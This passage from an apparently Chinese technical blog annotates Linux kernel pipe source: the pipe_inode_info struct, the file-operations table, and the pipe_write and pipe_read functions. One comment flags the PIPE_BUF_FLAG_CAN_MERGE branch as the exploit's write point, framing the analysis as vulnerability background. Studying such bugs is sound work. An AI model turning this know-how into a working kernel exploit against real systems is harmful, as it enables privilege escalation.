class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *@mutex: 保护一切的互斥锁</span><br><span class="hljs-comment"> *@rd_wait: 空管道中读者的等待点</span><br><span class="hljs-comment"> *@wr_wait: 满管道中写者的等待点</span><br><span class="hljs-comment"> *@head: 缓冲区的生产点</span><br><span class="hljs-comment"> *@tail: 缓冲区的消费点</span><br><span class="hljs-comment"> *@note_loss: 下一次 read() 应当插入一个 data-lost 消息</span><br><span class="hljs-comment"> *@max_usage: 在环中使用的 slots 的最大数量</span><br><span class="hljs-comment"> *@ring_size: 缓冲区的总数 (应当为 2 的幂次)</span><br><span class="hljs-comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *@tmp_page: 缓存的已释放的页面</span><br><span class="hljs-comment"> *@readers: 管道中现有的读者数量</span><br><span class="hljs-comment"> *@writers: 管道中现有的写者数量</span><br><span class="hljs-comment"> *@files: 引用了该管道的 file 结构体数量 (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *@r_counter: 读者计数器</span><br><span class="hljs-comment"> *@w_counter: 写者计数器</span><br><span class="hljs-comment"> *@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *@bufs: 管道缓冲区循环数组</span><br><span class="hljs-comment"> *@user: 创建该管道的用户</span><br><span class="hljs-comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="管道函数表："><a href="#管道函数表：" class="headerlink" title="管道函数表："></a>管道函数表：</h3><p>阅读 pipe 系统调用源码，注意到如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">do_pipe2</span>()</span><br><span class="hljs-function"><span class="hljs-title">__do_pipe_flags</span>()</span><br><span class="hljs-function"><span class="hljs-title">create_pipe_files</span>()</span><br><span class="hljs-function"><span class="hljs-title">alloc_file_pseudo</span>()</span><br></code></pre></td></tr></table></figure><p>在创建管道文件的函数 <code>create_pipe_files()</code> 中，传入 <code>alloc_file_pseudo()</code> 的函数表为 <code>pipefifo_fops</code>，这便是管道相关的操作的函数表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_pipe_files</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file **res, <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>&amp;pipefifo_fops);<br>    <br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>该函数表中定义了我们对管道的相关操作会调用到的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>.splice_write= iter_file_splice_write,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="管道的写入过程"><a href="#管道的写入过程" class="headerlink" title="管道的写入过程"></a>管道的写入过程</h3><p>查表 <code>pipefifo_fops</code> 可知当我们向管道内写入数据时，最终会调用到 <code>pipe_write</code> 函数，大概流程如下：</p><ul><li>若管道非空且上一个 buf 未满，则先尝试向上一个被写入的 buffer写入数据（若该 buffer 设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位）</li><li>接下来开始对新的 buffer 进行数据写入，若没有<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位则分配新页面后写入</li><li>循环第二步直到完成写入，若管道满了则会尝试唤醒读者让管道腾出空间</li></ul><p>这里我们可以看出 <code>PIPE_BUF_FLAG_CAN_MERGE</code> <strong>用以标识一个 pipe_buffer 是否已经分配了可以写入的空间</strong>，在大循环中若对应 pipe_buffer 没有设置该 flag（刚被初始化），则会<strong>新分配一个页面供写入，并设置该标志位</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">ssize_t</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(from);<br><span class="hljs-type">ssize_t</span> chars;<br><span class="hljs-type">bool</span> was_empty = <span class="hljs-literal">false</span>;<br><span class="hljs-type">bool</span> wake_next_writer = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/* Null write succeeds. */</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<span class="hljs-comment">// 管道没有读者，返回</span><br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>ret = -EPIPE;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (pipe-&gt;watch_queue) &#123;<br>ret = -EXDEV;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若管道非空，我们尝试将新数据合并到最后一个buffer 中</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 这自然会合并小的写操作，但其也会对</span><br><span class="hljs-comment"> * 跨越多个页框的大的写操作的剩余写入操作</span><br><span class="hljs-comment"> * 进行页面对齐</span><br><span class="hljs-comment"> * （译注：大概就是先尝试把数据写到管道的最后一个buffer（如果对应 page 没写满的话））</span><br><span class="hljs-comment"> */</span><br>head = pipe-&gt;head;<span class="hljs-comment">// 获取队列头</span><br>was_empty = pipe_empty(head, pipe-&gt;tail); <span class="hljs-comment">// head == tail</span><br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="hljs-comment">// 管道非空，且上一个 buf 没写满</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask]; <span class="hljs-comment">// 找到上一个 buf</span><br><span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 设置了PIPE_BUF_FLAG_CAN_MERGE标志位，</span><br><span class="hljs-comment">         * 说明该 buffer 可用于直接写入，</span><br><span class="hljs-comment">         * 直接把数据拷贝进去后就返回</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 注：这是漏洞利用的写入点</span><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>    offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>ret = -EFAULT;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>buf-&gt;len += ret;<br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br>    <span class="hljs-comment">// 写满 last buffer 对应数据后，接下来将剩余数据写到往后的 buffer 中</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<span class="hljs-comment">// 没有读者，返回</span><br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123; <span class="hljs-comment">// 管道没满，正常写入</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><span class="hljs-type">int</span> copied;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<span class="hljs-comment">// 没有预先准备page，分配一个新的</span><br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br><span class="hljs-comment">/* 提前在环中分配一个 slot，并附加一个空 buffer。</span><br><span class="hljs-comment"> * 若我们出错或未能使用它，</span><br><span class="hljs-comment"> * 它会被读者所使用，</span><br><span class="hljs-comment"> * 亦或是保留在这里等待下一次写入。</span><br><span class="hljs-comment"> */</span><br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<span class="hljs-comment">// 管道满了，开启下一次循环</span><br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br>pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br><span class="hljs-comment">/* 将其插入 buffer array 中 */</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<span class="hljs-comment">// 设置 buffer 的 flag，若设置了 O_DIRECT 则为 PACKET</span><br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<span class="hljs-comment">// 将数据拷贝到 buffer 对应 page 上</span><br><span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += copied;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = copied;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<span class="hljs-comment">// 读完数据了，退出循环</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<span class="hljs-comment">// 管道没满，继续下一次循环</span><br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/* 等待缓冲区空间可用. */</span><br>        <span class="hljs-comment">// 管道满了，等他变空</span><br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -ERESTARTSYS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们将释放管道的锁，等待（有）更多的空间。</span><br><span class="hljs-comment"> * 若有必要我们将唤醒任意读者，在等待后我们需要重新检查</span><br><span class="hljs-comment"> * 在我们释放锁后管道是否变空了</span><br><span class="hljs-comment"> */</span><br>__pipe_unlock(pipe);<br><span class="hljs-keyword">if</span> (was_empty)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));<br>__pipe_lock(pipe);<br>was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);<br>wake_next_writer = <span class="hljs-literal">true</span>;<br>&#125;<br>out:<br><span class="hljs-keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))<br>wake_next_writer = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若我们进行了一次唤醒事件，我们做一个“同步”唤醒，</span><br><span class="hljs-comment"> * 因为相比起让数据仍旧等待，我们想要让读者去尽快</span><br><span class="hljs-comment"> * 处理事情</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 尤其是，这对小的写操作重要，这是因为（例如）GNU 让</span><br><span class="hljs-comment"> * jobserver 使用小的写操作来唤醒等待的工作</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Epoll 则没有意义地想要一个唤醒，</span><br><span class="hljs-comment"> * 无论管道是否已经空了</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (was_empty || pipe-&gt;poll_usage)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br><span class="hljs-keyword">if</span> (wake_next_writer)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;<br><span class="hljs-type">int</span> err = file_update_time(filp);<br><span class="hljs-keyword">if</span> (err)<br>ret = err;<br>sb_end_write(file_inode(filp)-&gt;i_sb);<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="管道的读出过程"><a href="#管道的读出过程" class="headerlink" title="管道的读出过程"></a>管道的读出过程</h3><p>从管道中读出数据则是通过 <code>pipe_read</code>，主要是读取 buffer 对应 page 上的数据，若一个 buffer 被读完了则将其出列</p><p>原理还是比较简单的，这里就不深入分析了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *to)</span><br>&#123;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(to);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">bool</span> was_full, wake_next_reader = <span class="hljs-literal">false</span>;<br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-comment">/* Null read succeeds. */</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>ret = <span class="hljs-number">0</span>;<br>__pipe_lock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若管道满了，我们只在开始读取时唤醒写者</span><br><span class="hljs-comment"> * 以避免没有必要的唤醒</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 但当我们唤醒写者时，我们使用一个同步唤醒(WF_SYNC)</span><br><span class="hljs-comment"> * 因为我们想要他们行动起来并为我们生成更多数据</span><br><span class="hljs-comment"> */</span><br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head = pipe-&gt;head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span 